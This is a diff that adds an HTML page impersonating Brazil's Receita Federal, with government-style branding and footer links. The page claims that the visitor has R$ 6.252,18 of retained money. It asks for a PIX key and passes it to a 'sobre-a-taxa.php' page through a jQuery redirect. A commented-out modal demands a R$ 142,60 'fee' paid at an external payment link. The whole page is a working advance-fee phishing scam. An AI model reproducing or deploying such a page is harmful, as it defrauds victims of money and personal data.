@@ -1,0 +1,280 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+    <!-- Site made with Mobirise Website Builder v5.6.4, https://mobirise.com -->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="generator" content="Mobirise v5.6.4, mobirise.com">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image:src" content="">
+    <meta property="og:image" content="">
+    <meta name="twitter:title" content="WorkflowM5 Theme Web Chat Communication App Demo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+    <link rel="shortcut icon" href="assets/images/favicon-48x48-1.png" type="image/x-icon">
+    <meta name="description" content="New WorkflowM5 Theme HTML Template - Download Now!">
+
+
+    <title>Consultar CPF</title>
+    <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2-1.css">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min-1.css">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min-1.css">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min-1.css">
+    <link rel="stylesheet" href="assets/dropdown/css/style-1.css">
+    <link rel="stylesheet" href="assets/socicon/css/styles-1.css">
+    <link rel="stylesheet" href="assets/theme/css/style-1.css">
+    <link rel="preload" href="css-1?family=Kantumruy+Pro:100,200,300,400,500,600,700,100i,200i,300i,400i,500i,600i,700i&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript>
+        <link rel="stylesheet" href="css-1?family=Kantumruy+Pro:100,200,300,400,500,600,700,100i,200i,300i,400i,500i,600i,700i&amp;display=swap">
+    </noscript>
+    <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional-1.css">
+    <link rel="stylesheet" href="assets/mobirise/css/mbr-additional-1.css" type="text/css">
+
+    <!-- Remember to include jQuery :) -->
+        <script src="ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+
+        <!-- jQuery Modal -->
+        <script src="ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
+        <link rel="stylesheet" href="ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css">
+
+
+    <style type="text/css">
+        .text-black {
+            color: #1351b4 !important;
+        }
+        .btn-info {
+            background-color: #1351b4 !important;
+        }
+        .cid-tjRuWdZyqX {
+            background-color: #2559BF;
+        }
+        .cid-tjRuWdZyqX .mbr-text {
+            color: #fff;
+        }
+        .cid-tjRuWdZyqX a {
+            color: #fff !important;
+        }
+        .cid-tjRuWdZyqX .social-list .mbr-iconfont-social {
+            color: #1351b4 !important;
+        }
+        .cid-tjRueusv7U {
+            padding-top: 0 !important;
+        }
+        .conteudo {
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            padding-top: 12px;
+            padding-bottom: 12px;
+            font-size: 1.4rem;
+        }
+        .btn-consultar {
+            background-color: #268744;
+            height: 52px;
+            line-height: 52px;
+            width: 180px;
+            font-size: 20px;
+            font-weight: 600;
+            border-radius: 51px;
+            text-align: center;
+            color: #fff !important;
+            border: 15px solid #ededed;
+            margin-left: 30px;
+            -webkit-box-sizing: content-box;
+            box-sizing: content-box;
+            display: block;
+        }
+        .container-topo {
+            background-image: url('assets/images/bg-top.png') !important;
+        }
+        .cid-tjQDEIwxeU {
+            z-index: 1 !important;
+        }
+        
+    </style>
+
+</head>
+
+<body>
+
+    <section data-bs-version="5.1" class="menu menu1 cid-tjQDEIwxeU" once="menu" id="menu01-1">
+
+        <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg container-topo">
+            <div class="container">
+                <img src="assets/images/receita-left.png" style="float:left;">
+                
+                <!--<img src="assets/images/receita-right.png" style="float:right;" />-->
+                
+            </div>
+        </nav>
+        <div style="background: #0f4098;padding: 99px;">
+        </div>
+    </section>
+
+    <section data-bs-version="5.1" class="features13 cid-tjRueusv7U" id="features01-2">
+
+
+
+        <div class="container">
+            <div class="row">
+                <div class="col-12 mb-5">
+
+                    <!--<h5 class="mbr-section-title mbr-fonts-style align-left display-1"><strong>Features</strong></h5>-->
+                    <p class="card-text align-left mbr-fonts-style pt-4 mb-0 display-4" style="font-size: 25px;">
+                        <img src="assets/images/menu-icon-1.png" width="30" height="30"> Resultado da Pesquisa
+                    </p>
+
+                </div>
+
+                <div class="conteudo" style="font-size:16px;">
+                    
+                </div><!-- #conteudo -->
+
+                
+
+                <p>
+                    <h5 class="mbr-section-title mbr-fonts-style align-center" style="font-size: 36px;"><strong>SALDO RETIDO:</strong><br><strong style="color:red;">R$ 6.252,18</strong></h5>
+                
+
+                <p>
+                    Confirme suas informações para o saque:
+                    <br><br>
+                    Nome Completo: <br>
+                    CPF: <br>
+                    Nascimento: <br>
+                    Nome da Mãe: <br>
+                </p>
+
+                <p>
+                    <h5 class="mbr-section-title mbr-fonts-style align-center" style="font-size: 30px;"><strong>INSIRA A CHAVE PIX PARA REALIZAR SEU SAQUE:</strong></h5>
+
+                    <input type="text" id="chave-pix" placeholder="Ex: CPF/CNPJ, e-mail ou número de telefone" style="width: 400px;margin: 14px;">
+                    <br>
+                    <a class="btn-consultar" id="consultar" href="#">Realizar Meu Saque Agora</a>
+                
+
+            </div>
+            <div class="row">
+            </div>
+        </div>
+    </section>
+
+    
+
+    <section data-bs-version="5.1" class="footer1 cid-tjRuWdZyqX" once="footers" id="footer01-d">
+
+
+
+        <div class="container">
+            <div class="row justify-content-between">
+                <div class="col-12 col-md-12 col-lg-3">
+                    
+                    <div class="social-list text-center">
+
+                    
+
+                        <div class="soc-item">
+                            <a href="#" target="_blank">
+                                <span class="socicon-twitter socicon mbr-iconfont mbr-iconfont-social"></span>
+                            </a>
+                        </div>
+                        <div class="soc-item">
+                            <a href="#" target="_blank">
+                                <span class="socicon-facebook socicon mbr-iconfont mbr-iconfont-social"></span>
+                            </a>
+                        </div>
+                        <div class="soc-item">
+                            <a href="#" target="_blank">
+                                <span class="socicon-youtube socicon mbr-iconfont mbr-iconfont-social"></span>
+                            </a>
+                        </div>
+                        <div class="soc-item">
+                            <a href="#" target="_blank">
+                                <span class="mbr-iconfont mbr-iconfont-social socicon-skype socicon"></span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div class="col-12 col-md-12 col-lg-4">
+                    <ul class="foot-menu pt-2">
+
+
+
+                        <li class="foot-menu-item mbr-fonts-style display-4">
+                            <a href="#" class="text-black">Órgãos do Governo</a>
+                        </li>
+                        <li class="foot-menu-item mbr-fonts-style display-4">
+                            <a href="#" class="text-black">Acesso à Informação</a>
+                        </li>
+                        <li class="foot-menu-item mbr-fonts-style display-4">
+                            <a href="#" class="text-black">Legislação</a>
+                        </li>
+                        <li class="foot-menu-item mbr-fonts-style display-4">
+                            <a href="#" class="text-black">Acessibilidade</a>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="col-12 col-md-12 col-lg-5">
+                    <p class="mbr-text pt-3 align-right mbr-fonts-style display-4">
+                        
+                    </p>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!--<div id="ex1" class="modal" style="height: 580px;max-width: 600px;">
+        <div style="text-align:center;">
+            <p style="font-size: 25px;"><span><strong>ATENÇÃO! PARA PROSEGUIRMOS COM O SEU SAQUE DE <span style="color:red;font-weight: bold;">R$ 6.252,18</span> É NECESSÁRIO O PAGAMENTO DE UM TAXA ÚNICA DE R$ 142,60</strong></span></p>
+
+            <p style="font-size: 20px;"><span><strong>TAXA EQUIVALENTE A MENOS 2% DO VALOR A SACAR!</strong></span></p>
+
+            <p style="font-size: 18px;"><span><strong>Por que é cobrado essa taxa?</strong></span></p>
+
+            <p style="font-size: 18px;"><span><strong>Esta taxa é cobrado única e exclusivamente para manter nossos servidores ativos ajudando cada vez mais brasileiros a recuperarem seu dinheiro do governo. Agradecemos a compreensão!</strong></span></p>
+
+            <p>
+                <center><a class="btn-consultar" href="https://pay.pagamentoreceitabr.site/N1nVZpBeA9mglM6" id="btn-pagar-taxa">Pagar Taxa</a></center>
+            </p>
+        </div>
+
+        
+    </div>-->
+
+
+    <script src="assets/bootstrap/js/bootstrap.bundle.min-1.js"></script>
+    <script src="assets/smoothscroll/smooth-scroll-1.js"></script>
+    <script src="assets/ytplayer/index-1.js"></script>
+    <script src="assets/dropdown/js/navbar-dropdown-1.js"></script>
+    <script src="assets/mbr-switch-arrow/mbr-switch-arrow-1.js"></script>
+    <script src="assets/theme/js/script-1.js"></script>
+    <script src="sweetalert%402.1.2/dist/sweetalert.min-1.js"></script>
+    <script type="text/javascript" src="assets/js/jquery-1.2.6.pack-1.js"></script>
+    <script type="text/javascript" src="assets/js/jquery.maskedinput-1.1.4.pack-1.js"></script>
+
+    <script type="text/javascript">
+        $(function() {
+            
+            $('#consultar').click(function() {
+
+                if ( $('#chave-pix').val().trim() == '' ) {
+
+                    swal("ATENÇÃO, !", "Você precisa informar uma chave PIX válida para realizar seu saque agora.", "error");
+                } else {
+                    var chave_pix = $('#chave-pix').val();
+                    window.location.href="/sobre-a-taxa.php?chave-pix=" + chave_pix;
+                }
+
+                return false;
+                            
+            });
+            
+            
+        });
+    </script>
+
+</body>
+
+</html>
